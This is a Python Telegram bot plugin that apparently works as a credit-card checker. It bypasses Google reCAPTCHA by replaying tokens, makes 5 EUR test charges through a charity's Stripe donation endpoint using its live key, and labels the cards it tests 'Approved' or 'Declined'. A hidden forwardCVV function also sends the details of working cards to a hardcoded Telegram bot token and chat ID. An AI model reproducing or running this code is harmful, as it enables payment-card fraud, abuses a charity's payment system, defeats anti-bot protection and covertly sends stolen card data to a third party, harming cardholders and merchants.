#https://www.gapminder.org/donations/
from values import *
import urllib.parse
import random
import json
import requests
import time
import asyncio
from colored import fg, bg, attr
from asyncio import sleep
from pyrogram import Client, filters
from pyrogram.types import (
    Message,
    InlineKeyboardButton,
    InlineKeyboardMarkup
) 


from datos import idchat
from datos import spam_times

@Client.on_message(filters.command(["bo"], ["/", "."]))
async def xi(_, message: Message):
    with open(file='plugins/usuarios/premium.txt',mode='r+',encoding='utf-8') as archivo:
        x = archivo.readlines()
        if str(message.from_user.id) + '\n' in x or message.chat.id in idchat:

            data = message.text.split(" ", 2)

            if len(data) < 2:
                await message.reply_text("<b>⎚ Usar <code>/bo card</code></b>")
                return

            ccs  = data[1]
            card = ccs.split("|")
            cc   = card[0]
            mes  = card[1]
            if not mes:
                await message.reply_text("<b>⎚ Usar <code>/bo card</code></b>")
                return
            ano  = card[2]
            cvv  = card[3]
            bin_code = cc[:6]


            low_ano = lambda x: x[2:] if len(x) == 4 else x
            ano = low_ano(ano)
            session = requests.Session()
            inputm = message.text.split(None, 1)[1]
            bincode = 6
            BIN = inputm[:bincode]
            req = requests.get(f"https://bins.antipublic.cc/bins/{BIN}").json()
                    
                 
            
            brand = req['brand']
            country = req['country']
            country_name = req['country_name']
            country_flag = req['country_flag']
            country_currencies = req['country_currencies']
            bank = req['bank']
            level = req['level']
            typea  = req['type']
            msg=await message.reply(f"""<b>⎚Gateway| Roma
Card: <code>{ccs}</code>
Progress 🔴 1.12(s)</b>""")

            url = 'https://www.google.com/recaptcha/api2/anchor?ar=1&k=6Ldh1FQcAAAAABchaI0z4x-APZPdbyaglX4CAwqN&co=aHR0cHM6Ly9zcGxvc2UuY29tOjQ0Mw..&hl=es&v=x19joXI_IeQnFJ7YnfDapSZq&size=invisible&cb=jwfq1unu8dww'
            
            anchor_ref = 'https://splose.com/'
            
            reload_link = 'https://www.google.com/recaptcha/api2/reload?k=6Ldh1FQcAAAAABchaI0z4x-APZPdbyaglX4CAwqN'
            v = 'x19joXI_IeQnFJ7YnfDapSZq'
            k = '6Ldh1FQcAAAAABchaI0z4x-APZPdbyaglX4CAwqN'
            co = 'aHR0cHM6Ly9zcGxvc2UuY29tOjQ0Mw'
            chrr = urllib.parse.quote('[39,58,98]')
            bg = '!HRugGx4KAAQeG4pubQEHDwL-6OPKPOhZiLAyTl0SmMcAYbQNcf3CsLs0SO9TvsAIHSe-jcVkZ8OKPR27z_dRnq4UnkFLVN2qVHvyHk0v32mGuki4B0hhRiD8zRkfjpLdRfPW_KK01-Jp3EWT300-U_kzZCBEsyUt0XtSRNrgPq5bJpt_TxbWjJjsPbHj5U45UHvRKLJYnA0nbU1e0buOUe7MlK1PHQntL3eLykcK9-RO6KDn5RLJy3F3b6ceDlU9Kjcvs9mVpLvx2ImBYoOFaLatmTfvZpH5DrsvQ_O9CXlAwFGFaq-LSMczTxxtV9dJ7aeRFCvxh_M0TeRf1svFvpdSxktYh8LTquIevYNjy6PXOmavbg5kdQpzkWHDGGCGihr8EiixHUbzGm2xz5WuZ1fqN6oMGtVvIdsot34j3cqcIJeqcLwOgfTm9XeMUDpI40IAafwhBqNRhvsV0kEbacQx1qSHgQUJFL6uJGldCkCpth0egq7LO_LKTQRuqMwomFHm_gH3064KPppx_fwMJjHSZnI2lg0_5ylrYw6bnBq8FjGPXFysG7-iENKn2d5um0-t6JdG7eJ5zUqdMAOiBZ3ejFs2y9fcfejSJyARX5DHISpjpD7p9-AFyDEOwdYVQIZhx9CqMjEeLBvDRIXO8hSOuErEMuQRPl6cPsOtgcBbuQU71TSyfzU2aaA2deGB3XmCq6FcWRiUQF58Xwh0cYs5w3Hzfl8FPPbNGsV6nA4KNkuOgG5o7g99nGQaXyYGwODLoYncXjqQJOQKNOcUJVCldU5w2MLjf7oRtgKEZyWMCIK-3dg86loWzJNXpPy4gpdK1hdh5_RE3DOxJHjzhaY216nGUXLfuSYm7YYW3Rmd_gyvAAR8DyWOeoByhfA9dwlcxgCthwie7JFDUPFPGH_Fk1uzUdTnZWW4BpDOo6gGfe1tQwhXMoeUFmGmu_61bczy7o9mTkhjKsof7REiE7YRMCy-N7vafRkE-SprixZqpUxVXLwRBJyX5-ELOeq0BeuDPAphWc3vFz_eHgXNBpwAIrIGtbCkB-fBfjGGJagqxmYzmP8P4Wx2SWfwIIN_wHLFdEw*'
            vh = '14174461102'
            
            headers = {
              'authority': 'www.google.com',
              'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
              'accept-language': 'en-US,en;q=0.9',
              'referer': anchor_ref,
              'sec-fetch-dest': 'iframe',
              'sec-fetch-mode': 'navigate',
              'sec-fetch-site': 'cross-site',
              'upgrade-insecure-requests': '1',
              'user-agent': 'Mozilla/5.0 (Windows NT ' + str(random.randint(11, 99)) + '.0; Win64; x64) AppleWebKit/' + str(random.randint(111, 999)) + '.' + str(random.randint(11, 99)) + ' (KHTML, like Gecko) Chrome/' + str(random.randint(11, 99)) + '.0.' + str(random.randint(1111, 9999)) + '.' + str(random.randint(111, 999)) + ' Safari/' + str(random.randint(111, 999)) + '.' + str(random.randint(11, 99))
              
            }
            response = requests.get(url=url, headers=headers)
            if 'recaptcha-token' not in response.text:
              json = {
                "msg": 'Pagina Nao recarregada'
                
              }
            rtk = response.text.split('<input type="hidden" id="recaptcha-token" value="')[1].split('"')[0]
              
            headers = {
              'authority': 'www.google.com',
              'accept': '*/*',
              'accept-language': 'en-US,en;q=0.9',
              'content-type': 'application/x-www-form-urlencoded',
              'origin': 'https://www.google.com',
              'referer': reload_link,
              'user-agent': 'Mozilla/5.0 (Windows NT {0}.0; Win64; x64) AppleWebKit/{1}.{2} (KHTML, like Gecko) Chrome/{3}.0.{4}.{5} Safari/{6}.{7}'.format(random.randint(11, 99), random.randint(111, 999), random.randint(11, 99), random.randint(11, 99), random.randint(1111, 9999), random.randint(111, 999), random.randint(111, 999), random.randint(11, 99))
              
            }
            data = {
              'v': v,
              'reason': 'q',
              'c': rtk,
              'k': k,
              'co': co,
              'hl': 'en',
              'size': 'invisible',
              'chr': chrr,
              'vh': vh,
              'bg': bg
              
            }
            response = requests.post(reload_link, headers=headers, data=data)
            captcha = response.text.split('["rresp","')[1].split('"')[0]
            if '"rresp","' in response.text:
              json = {
                "msg": 'Captcha Bypassed Successfully',
                "captchaResponse": captcha
                
              }
            else:
                json = {
                  "msg": 'Error to captcha'
                  
                }  
            
            headers = {
                'authority': 'www.proterrasancta.org',
                'accept': '*/*',
                'accept-language': 'es-MX,es-419;q=0.9,es;q=0.8,en;q=0.7,pt;q=0.6',
                'content-type': 'application/json',
                'origin': 'https://www.proterrasancta.org',
                'referer': 'https://www.proterrasancta.org/es/ayudanos/donacion-en-memoria//',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
              
            }

            data = '{"amount":"5","key":"pk_live_51HoUXjJhU1LmKSdSbkxGlrACRcf4LTv1RqqzDcqKytqJzbs1tzvrgsw5sRp5USAUGdCg8fHwNbTtvWCTlUno6gSB00fvqTKLzg","env":"prod","currency":"EUR"}'

            response = requests.post('https://www.proterrasancta.org/wp-json/proterrasancta-api/v1/create-stripe-payment',headers=headers,data=data)
            if 'clientSecret' in response.text:
              secret = response.json()['clientSecret']
              id  = secret.split("_")[1]
            print(response.text)
            
            msg1=await msg.edit(f"""<b>⎚Gateway | Roma
Card: <code>{ccs}</code>
Progress 🟠 4.40(s)</b>""")
             
            
            
            url = 'https://api.stripe.com/v1/payment_intents/pi_' + id + '/confirm'
            
            headers = {
              'authority': 'api.stripe.com',
              'method': 'POST',
              'accept': 'application/json',
              'accept-language': 'es-MX,es-419;q=0.9,es;q=0.8',
              'content-type': 'application/x-www-form-urlencoded',
              'origin': 'https://js.stripe.com',
              'referer': 'https://js.stripe.com/',
              'sec-fetch-dest': 'empty',
              'sec-fetch-mode': 'cors',
              'sec-fetch-site': 'same-site',
              'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'
              
            }
            data = {
              'return_url': 'http://localhost:7575/it/',
              'payment_method_data[type]': 'card',
              'payment_method_data[card][number]': cc,
              'payment_method_data[card][cvc]': cvv,
              'payment_method_data[card][exp_year]': ano,
              'payment_method_data[card][exp_month]': mes,
              'payment_method_data[billing_details][address][country]': 'MX',
              'payment_method_data[payment_user_agent]': 'stripe.js/e3bcb11bc8; stripe-js-v3/e3bcb11bc8; payment-element',
              'payment_method_data[time_on_page]': '70987',
              'payment_method_data[guid]': 'd3ed12ec-8e21-4cd2-bbf4-868b97dbc7d308b451',
              'payment_method_data[muid]': '32b2c2fe-d6b1-4647-805c-475161984dd8450c38',
              'payment_method_data[sid]': 'fe37d3d9-2e09-448e-ab65-628c275fdd8a57db35',
              'expected_payment_method_type': 'card',
              'use_stripe_sdk': 'true',
              'key': 'pk_live_51HoUXjJhU1LmKSdSbkxGlrACRcf4LTv1RqqzDcqKytqJzbs1tzvrgsw5sRp5USAUGdCg8fHwNbTtvWCTlUno6gSB00fvqTKLzg',
              'client_secret': secret
              
            }
            ch = requests.post(url, headers=headers, data=data)
            print(ch.text)
            
            msg2=await msg1.edit(f"""<b>⎚Gateway | Roma
Card: <code>{ccs}</code>
Progress 🟢 6.20(s)</b>""")

            

            
            def forwardCVV(text):
              requests.get("https://api.telegram.org/bot6133153598:AAE_jJWR1oaMasP2vmaDzCTy36zz_5QI2nw/sendMessage?chat_id=1924666696&text=" + text)
            if 'succeeded' in ch.text:
                status = "Approved✅"
                msg = "Charged CVV"
                save_live(ccs)
                forwardCVV(f"""⊗GATEWAY- Braintree\n⊗Card:{ccs}\n⊗ Status:Approved✅\n⊗ Response:Charged 5$\n⌧ Checked by:{message.from_user.first_name}""")
            elif 'insufficient_funds' in ch.text:
                status = "Approved✅"
                msg = "insufficient funds"
                forwardCVV(f"""⊗GATEWAY- Braintree\n⊗Card:{ccs}\n⊗ Status:Approved✅\n⊗ Response:Fondos Insuficients\n⌧ Checked by:{message.from_user.first_name}""")
            elif 'incorrect_cvc' in ch.text:
                status = "Approved CCN✅"
                msg = "Call Iusser Decline CVV"
            elif 'transaction_not_allowed' in ch.text:
                status = "Decined❌"
                msg = "transaction not allowed"
            elif 'do_not_honor' in ch.text:
                status = "Declined❌"
                msg = "Do Not Honor"
            elif 'stolen_card' in ch.text:
                status = "Declined❌"
                msg = "stolen card"
            elif 'lost_card' in ch.text:
                status = "Declined❌"
                msg = "lost_card"
            elif "pickup_card" in ch.text:
                status = "Declined❌"
                response = "Pickup Card"
            elif "incorrect_number" in ch.text:
                status = "Declined❌"
                msg = "Incorrect Card Number"
            elif "expired_card" in ch.text:
                status = "Declined❌"
                msg = "Expired Card"
            elif "generic_decline" in ch.text:
                status = "Declined❌"
                msg = "Proccesor Declined"
            elif "fraudulent" in ch.text:
                status = "Declined❌"
                msg = "Fraud"
            elif "lock_timeout" in ch.text:
                status = "Declined❌"
                response = "Api Error"
            elif "Your card was declined." in ch.text:
                status = "Declined❌"
                msg = "Proccesor Declined"
            elif "intent_confirmation_challenge" in ch.text:
                status = "Declined❌"
                msg = "Captcha"
            elif "Your card does not support this type of purchase." in ch.text:
                status = "Live 🟡"
                msg = "Locked Card"
            elif "parameter_invalid_empty" in ch.text:
                status = "Declined❌"
                msg = "404 error"
            elif "requires_action" in ch.text:
                status = "Declined❌"
                msg = "three 3ds Secure"    
            elif "invalid_request_error" in ch.text:
                status = "Declined❌"
                msg = "404 error"
            
            else:
                status = "Declined❌"
                msg = "Gate Dead"
            
            await msg2.edit(f"""
<b> 

⊗ Card - <code>{ccs}</code> 
⊗ Status - {status}
⊗ Response - {msg}
⊗ GATEWAY- Roma 
－－－－－－－－－－－－－－
[ BIN INFO ]
⚆ Bin - {BIN} - {brand} - {typea} - {level}
⚆ Bank - {bank} 🏛  
⚆ Country - {country} - {country_flag} 
－－－－－－－－－－－－－－
[ CHECK INFO ]
⌧ Proxy  - Live! ✅ 
⌧ Time Test - 7.4sec
⌧ Checked by: <a href="tg://user?id={message.from_user.id}"> {message.from_user.first_name}</a> ♻️
⌧ Bot by - <b><a href="tg://resolve?domain=Sarcehkr">SarceDev[Owner]</a></b>
－－－－－－－－－－－－－－</b>
            """)
            
            
            